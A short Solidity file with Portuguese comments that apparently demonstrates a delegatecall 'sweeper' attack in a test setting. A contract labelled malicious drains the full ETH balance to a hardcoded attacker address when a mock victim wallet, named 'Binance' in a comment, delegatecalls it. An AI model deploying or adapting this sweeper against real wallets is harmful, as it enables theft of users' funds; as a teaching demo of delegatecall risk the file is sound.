// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Contrato malicioso do atacante (o "Sweeper")
contract MaliciousSweeper {
    // Endereço fixo do atacante (hardcoded)
    // No nosso teste, o atacante é 0x2
    address constant ATTACKER = address(0x2);

    // Esta função será executada no contexto da carteira da vítima
    function sweep() external {
        // Transfere todo o saldo de ETH da vítima para o atacante
        payable(ATTACKER).transfer(address(this).balance);
    }
}

// Contrato que simula a "Carteira da Vítima" (a Binance)
contract VictimWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function delegateTo(address _target) external {
        require(msg.sender == owner, "Not the owner");
        (bool success, ) = _target.delegatecall(
            abi.encodeWithSignature("sweep()")
        );
        require(success, "Delegatecall failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}